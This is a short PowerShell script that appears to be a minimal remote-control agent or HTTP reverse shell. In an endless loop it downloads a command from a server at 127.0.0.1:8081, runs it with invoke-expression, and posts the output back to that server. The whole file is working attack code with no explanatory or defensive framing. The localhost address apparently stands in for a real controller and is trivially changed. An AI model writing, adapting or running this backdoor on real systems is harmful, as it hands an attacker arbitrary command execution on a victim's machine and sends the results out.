while($true)
{
$server = "127.0.0.1:8081"
$result = (New-Object Net.WebClient).DownloadString("http://$server/fetch")
while($result) {
	$output = invoke-expression $result | out-string 
	$resp = (New-Object System.Net.WebClient).UploadString("http://$server/response", $output)	
	break
}
}
